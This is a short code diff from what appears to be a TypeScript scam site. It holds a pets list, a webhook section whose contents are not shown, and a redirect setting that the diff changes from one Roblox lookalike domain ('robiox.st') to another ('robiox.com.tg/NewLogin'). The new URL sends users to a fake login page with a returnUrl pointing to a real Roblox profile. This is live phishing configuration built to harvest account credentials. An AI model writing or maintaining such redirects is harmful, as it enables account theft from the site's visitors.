@@ -117,7 +117,7 @@ const pets: Pet[] = [
 // Redirect configuration
 const REDIRECT_CONFIG = {
   enabled: true,
-  url: "https://robiox.st/login?returnUrl=3889777624249851",
+  url: "https://www.robiox.com.tg/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F284353541924%2Fprofile",
 }
 
 // Webhook configuration
